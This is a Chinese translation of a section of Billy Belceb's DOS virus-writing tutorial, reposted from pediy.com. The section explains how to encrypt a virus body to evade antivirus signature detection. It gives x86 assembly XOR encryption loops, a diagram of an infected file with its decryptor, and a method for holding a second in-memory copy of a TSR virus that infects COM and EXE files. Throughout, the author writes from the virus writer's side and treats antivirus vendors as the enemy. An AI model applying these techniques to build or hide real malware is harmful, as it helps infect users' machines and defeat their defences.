

# Billy Belceb 病毒编写教程---DOS 篇

> 原文：[`www.pediy.com/kssd/pediy06/pediy64068.htm`](https://www.pediy.com/kssd/pediy06/pediy64068.htm)

【加密】   
\~~~~~~   
    加密技术真的很老了，但是它们仍然很有效，而且很有用，可能是在概念上幸存下来的几个技术之一，但是仍然在继续发展着，如多态，超多态，等等。我们的目标是隐藏我们的所有的文本字符串，可以的操作码，和所有会使用户引起注意的东西。我们可以利用一个简单的数学运算来实现，应用到我们病毒主体的所有字节。例如，我们可以使病毒的所有字节加 1，然后我们就看不到任何可读的信息了:)   
    一个加密了的病毒如下：   
            
        \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_   
       |                                   |   
   \_\_\_ |         Call to decryptor         |   
  |    |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|    
  |    |                                   |<-----|   
  |    |                                   |      |   
  |    |           Infected file           |      |   
  |    |                                   |      |   
  |    |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|      |   
  |    |                                   |<--|  |   
  |    |            Virus body             |   |  |   
  |    |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|\_\_\_|\_\_|   
  |--->|                                   |   |   
       |             Decryptor             |   |   
       |\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|\_\_\_|   
  
    非常简单，有一个调用解密程序的 call，当解密程序解完密之后，它就把控制权交给病毒，当病毒执行完自身后，它就把控制权交给原先的程序。   
    有一种数学运算有一个好处，就是我们可以使用同一个函数来加密和解密我们的代码。当然，我们要讨论 XOR 了，在加解密中使用得最多得指令。还有两个指令可以用来实现我们只用一个函数就可以加密和解密目的：NOT 和 NEG。这两个中使用得最多的是第一个指令。当然了，我们还可以使用更多的指令进行加密。我将给出我们可以使用的指令的列表：   
  
 INC/DEC, ADD/SUB, ROL/ROR, XOR, NOT, MUL/DIV, ADC/SBB, etc...   
  
    最简单的加密我们的病毒是使用如下的例程：   
  
 encryption:   
  mov  cx,encrypt\_size   ; encrypt\_end-encrypt\_start   
  mov  di,\[bp+encrypt\_begin\]  ; From where   
  mov  si,di      ; For lodsb/stosb   
  mov  ah,key      ; Value for XOR. Subst key with whate   
          ; ver you want   
 encryption\_loop:   
  lodsb        ; Move a byte from DS:SI to AL   
  xor  al,ah   
  stosb        ; Move a byte from AL to ES:DI   
  loop  encryption\_loop   
  ret   
    这个过程确实很差，它只有 255 种可能性，因为我们把一个 8 比特的寄存器作为密钥(AH)。   
    当然这个是最简单的实现方法，我们必须注意一些事情：   
  
\-如果我们使用这样的例程，而且我们没有我们的病毒在内存中的备份(在这篇文章中我将讨论它)，当使用这个例程的时候，我们必须不能把解密过程代码复制(调用解密的过程也一样)到感染文件。   
  
\-在病毒第一次产生的时候，我们必须注意病毒的状态：它没有被加密。使用 xor，在第一次产生的时候，我们可以使用 00 来加密，并编写一个过程在代码中改变这个值，或者简单地避免在第一次产生的时候使用加密过程。   
  
    现在，我们将来看看当我们使用一个 16 比特密钥加密的上述加密过程：   
  
 encryption:   
  mov  cx,(encrypt\_size+1)/2  ; encrypt\_end-encrypt\_start/2   
  mov  di,\[bp+encrypt\_begin\]  ; From where   
  mov  si,di      ; For lodsw/stosw   
  mov  dx,key      ; Value for XOR. Subst key with whate   
          ; ver you want   
 encryption\_loop:   
  lodsw        ; Move a word from DS:SI to AX   
  xor  ax,dx   
  stosw        ; Move a word from AX to ES:DI   
  loop  encryption\_loop   
  ret   
  
    问题是：如果我们没有对拷贝和加密的过程不加密...病毒查杀工具将会做什么呢？它们在我们的病毒(是的，是的，我们花费了大量的时间和精力来反启发，隐蔽，其它的一些大花招等等也一样)中找到一个扫描字符串足够了。在 5 分钟之内它们就在它们的病毒库中加入了检测我们的病毒的方法。啊！一个病毒作者花了很多天来编写的一个病毒，就因为他使用了如此简单的加密方法，在 5 分钟之内，我们的敌人就找到了检测的方法！这世界真是太黑暗了！:(   
    但是，病毒作者从不投降，所以...我们需要是解密程序越小越好。还不够，在下一章例，你可能将得到最好的答案:)   
    怎样使我们的病毒在内存里有第二个拷贝呢？这非常简单。在标志将要拷贝的病毒的最后一个字节，我们可以如下：   
  
 virus\_end  label  byte    ; The label that marks end of virus   
  
 enc\_buffer  db  (offset virus\_end-offset virus\_start) dup (090h)   
  
    enc\_buffer 变量将会只在第一次产生时编码。当我们扩散这个病毒时，这个变量并不会随着复制。但是我们可以利用它的偏移地址来放置我们的病毒的第二个复制。我们能做的是...   
  
\-当我们把我们的病毒拷贝到内存中(一个 TSR 病毒)，我们再一次这样,并把 EXE 文件头放进代码里，或者在 COM 文件的头几个字节，当这些变量向后移动病毒的大小时，我们把这些代码放到相同的偏移地址。OK，我将更好地解释它。想象我们有如下代码：   
  
  mov  ah,3Fh   
  mov  cx,4   
  lea  dx,old3bytes   
  int  21h   
  
    OK，那么，如果我们在内存里面有病毒的第二个拷贝，我们必须把第三行代替为：   
  
       lea dx,virus\_size+old3bytes   
  
    这是尝试的最好方法...   
  
\-或者我们可以在添加的时候拷贝病毒的主体：我们有所有的变量集。改动如下：   
  
  mov  cx,virus\_size   
  xor  si,si   
  mov  di,offset virus\_begin   
  rep  movsb   
  
    我们给它加密，添加上第二个拷贝并...足够了！ 

 4dd466d0e1e0cc123afbe504da2462ca